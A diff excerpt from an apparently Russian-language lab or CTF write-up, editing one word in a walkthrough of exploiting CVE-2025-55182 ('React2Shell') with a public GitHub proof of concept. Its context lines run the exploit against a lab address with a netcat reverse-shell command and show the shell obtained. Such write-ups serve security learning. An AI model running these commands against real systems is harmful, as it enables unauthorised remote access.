@@ -61,7 +61,7 @@ PORT     STATE SERVICE VERSION
 
 
 Теперь мы можем поискать готовый poc на github, сделаю это через гугл дорк так как это будет удобнее site:github.com React2Shell-poc
-находим https://github.com/whiteov3rflow/CVE-2025-55182-poc, перед проверкой любого готового exploits стоит посмотреть на его исходный код, на проверку бэкдора или еще каких то гадостей
+находим https://github.com/whiteov3rflow/CVE-2025-55182-poc, перед проверкой любого готового poc стоит посмотреть на его исходный код, на проверку бэкдора или еще каких то гадостей
 проверил, ничего нету уязвимого, приступаем к експлутации 
 python3 exploit.py "busybox nc IP 4444 -e sh"  http://10.129.245.214:3000
 node@reactor:/opt/reactor-app$ id
